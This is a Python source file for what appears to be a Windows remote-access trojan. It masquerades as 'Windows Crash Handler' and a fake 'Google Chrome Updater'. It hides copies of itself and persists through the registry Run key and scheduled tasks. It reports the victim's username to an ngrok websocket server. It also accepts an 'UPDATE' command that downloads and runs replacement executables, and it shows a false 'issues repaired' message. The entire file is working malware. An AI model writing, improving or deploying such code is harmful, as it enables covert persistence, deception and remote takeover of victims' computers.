import asyncio
import websockets
import threading
import tkinter as tk
from tkinter import messagebox
import pystray
from PIL import Image, ImageDraw
import sys
import os
import winreg
import ctypes
import subprocess
import shutil

SERVER_URL = "wss://laila-leavenless-overinsistently.ngrok-free.dev"  # <-- Replace with your ngrok URL

APP_NAME = "WindowsCrashHandler"
REAL_NAME = "ChromeUpdater"
name = "Friend"

def get_real_path():
    candidates = [
        os.path.join(os.path.expanduser("~"), "Pictures"),
        os.path.join(os.path.expanduser("~"), "Music"),
        os.path.join(os.path.expanduser("~"), "Videos"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
        os.path.join(os.path.expanduser("~"), "Documents"),
    ]
    for folder in candidates:
        if folder and os.path.isdir(folder):
            test_path = os.path.join(folder, f"{REAL_NAME}.exe")
            try:
                with open(test_path + ".tmp", "w") as f:
                    f.write("test")
                os.remove(test_path + ".tmp")
                return test_path
            except:
                continue
    return os.path.join(os.path.expanduser("~"), f"{REAL_NAME}.exe")

REAL_PATH = get_real_path()

def remove_old_copies():
    # Remove any old copies of ChromeUpdater from other locations
    appdata_dir = os.environ.get("APPDATA")
    folders = [
        os.path.join(os.path.expanduser("~"), "Pictures"),
        os.path.join(os.path.expanduser("~"), "Music"),
        os.path.join(os.path.expanduser("~"), "Videos"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.expanduser("~"),
    ]
    if appdata_dir and os.path.isdir(appdata_dir):
        folders.append(appdata_dir)

    for folder in folders:
        if not folder or not os.path.isdir(folder):
            continue
        path = os.path.join(folder, f"{REAL_NAME}.exe")
        if path.lower() != REAL_PATH.lower() and os.path.exists(path):
            try:
                subprocess.run(f'taskkill /f /im {REAL_NAME}.exe', shell=True, capture_output=True)
                import time; time.sleep(1)
                # Remove hidden/system attributes first
                ctypes.windll.kernel32.SetFileAttributesW(path, 0x80)
                os.remove(path)
            except Exception:
                pass

def drop_real_client():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    try:
        subprocess.run(f'taskkill /f /im {REAL_NAME}.exe', shell=True, capture_output=True)
        import time; time.sleep(2)
        os.makedirs(os.path.dirname(REAL_PATH), exist_ok=True)
        shutil.copy2(exe_path, REAL_PATH)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        FILE_ATTRIBUTE_SYSTEM = 0x04
        ctypes.windll.kernel32.SetFileAttributesW(REAL_PATH, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
    except:
        pass

def launch_real_client():
    try:
        subprocess.Popen(
            [REAL_PATH],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True
        )
    except:
        pass

def add_to_startup():
    exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REAL_NAME, 0, winreg.REG_SZ, REAL_PATH)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

def add_to_task_scheduler():
    exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    try:
        subprocess.run(f'schtasks /create /f /tn "{REAL_NAME}" /tr "{REAL_PATH}" /sc minute /mo 30 /rl limited', shell=True, capture_output=True)
        subprocess.run(f'schtasks /create /f /tn "{APP_NAME}" /tr "{exe_path}" /sc minute /mo 30 /rl limited', shell=True, capture_output=True)
    except:
        pass

def hide_decoy():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    try:
        ctypes.windll.kernel32.SetFileAttributesW(exe_path, 0x02 | 0x04)
    except:
        pass

def is_real_client():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    return os.path.dirname(os.path.abspath(exe_path)).lower() == os.path.dirname(REAL_PATH).lower()

def is_chrome_updater_running():
    result = subprocess.run(f'tasklist /fi "imagename eq {REAL_NAME}.exe"', shell=True, capture_output=True, text=True)
    return f"{REAL_NAME}.exe" in result.stdout

def is_already_running():
    mutex_name = REAL_NAME if is_real_client() else APP_NAME
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
    if ctypes.windll.kernel32.GetLastError() == 183:
        return True
    return False

def show_text_popup(msg):
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    messagebox.showinfo("Windows Crash Handler", msg, parent=root)
    root.destroy()

def show_image_popup(data):
    import base64
    from PIL import ImageTk
    import io
    img_bytes = base64.b64decode(data)
    img = Image.open(io.BytesIO(img_bytes))
    root = tk.Tk()
    root.title("Windows Crash Handler")
    root.attributes("-topmost", True)
    root.configure(bg="#0f0f1a")
    img.thumbnail((600, 500))
    photo = ImageTk.PhotoImage(img)
    tk.Label(root, image=photo, bg="#0f0f1a").pack(padx=10, pady=10)
    tk.Button(root, text="Close", command=root.destroy,
              bg="#0078d4", fg="white", font=("Courier New", 10),
              bd=0, padx=20, pady=6).pack(pady=(0, 10))
    root.mainloop()

def apply_update(data):
    import base64
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    new_path = exe_path + ".new"
    try:
        with open(new_path, "wb") as f:
            f.write(base64.b64decode(data))
        bat = os.path.join(os.path.expanduser("~"), "_upd.bat")
        with open(bat, "w") as f:
            lines = [
                "@echo off",
                "timeout /t 2 /nobreak >nul",
                f'move /y "{new_path}" "{exe_path}"',
                f'start "" "{exe_path}"',
                'del "%~f0"'
            ]
            f.write("\n".join(lines))
        subprocess.Popen(["cmd", "/c", bat], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit()
    except:
        pass

def handle_message(msg):
    if msg.startswith("TEXT:"):
        threading.Thread(target=show_text_popup, args=(msg[5:],), daemon=True).start()
    elif msg.startswith("IMAGE:"):
        threading.Thread(target=show_image_popup, args=(msg[6:],), daemon=True).start()
    elif msg.startswith("UPDATE:"):
        threading.Thread(target=apply_update, args=(msg[7:],), daemon=True).start()
    else:
        threading.Thread(target=show_text_popup, args=(msg,), daemon=True).start()

def make_windows_icon():
    # Blue shield icon that looks like a Windows security tool
    img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(img)
    draw.rectangle([4, 4, 60, 60], fill="#0078d4")
    draw.polygon([32, 10, 54, 20, 54, 38, 32, 54, 10, 38, 10, 20], fill="#ffffff")
    draw.polygon([32, 18, 46, 26, 46, 38, 32, 46, 18, 38, 18, 26], fill="#0078d4")
    draw.ellipse([26, 28, 38, 40], fill="#ffffff")
    return img

def quit_app(icon, item):
    icon.stop()
    sys.exit()

async def connect_loop():
    while True:
        try:
            async with websockets.connect(SERVER_URL, max_size=100*1024*1024) as ws:
                await ws.send(name)
                async for message in ws:
                    handle_message(message)
        except:
            await asyncio.sleep(5)

def run_ws():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(connect_loop())

def run_as_real_client():
    global name
    if is_already_running():
        sys.exit()
    name = os.getenv("USERNAME") or os.getenv("USER") or "User"
    t = threading.Thread(target=run_ws, daemon=True)
    t.start()
    icon_image = make_windows_icon()
    icon = pystray.Icon(
        REAL_NAME,
        icon_image,
        "Google Chrome Updater",
        menu=pystray.Menu(
            pystray.MenuItem("Google Chrome Updater", lambda: None, enabled=False),
            pystray.MenuItem("Checking for updates...", lambda: None, enabled=False),
            pystray.MenuItem("Quit", quit_app)
        )
    )
    icon.run()

def run_as_decoy():
    flag = os.path.join(os.path.expanduser("~"), ".wch_done")
    first_run = not os.path.exists(flag)

    remove_old_copies()

    if not is_chrome_updater_running():
        drop_real_client()
        launch_real_client()

    add_to_startup()
    add_to_task_scheduler()
    hide_decoy()

    if first_run:
        try:
            open(flag, "w").close()
        except:
            pass
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo(
            "Windows Crash Handler",
            "System scan complete.\n\n✅ 3 issues repaired successfully.\n\nYour system is now protected."
        )
        root.destroy()

    # Stay in taskmanager as decoy
    icon_image = make_windows_icon()
    icon = pystray.Icon(
        APP_NAME,
        icon_image,
        "Windows Crash Handler — Monitoring",
        menu=pystray.Menu(
            pystray.MenuItem("Windows Crash Handler", lambda: None, enabled=False),
            pystray.MenuItem("Status: System protected", lambda: None, enabled=False),
            pystray.MenuItem("Quit", quit_app)
        )
    )
    icon.run()

def main():
    if is_real_client():
        run_as_real_client()
    else:
        run_as_decoy()

if __name__ == "__main__":
    main()
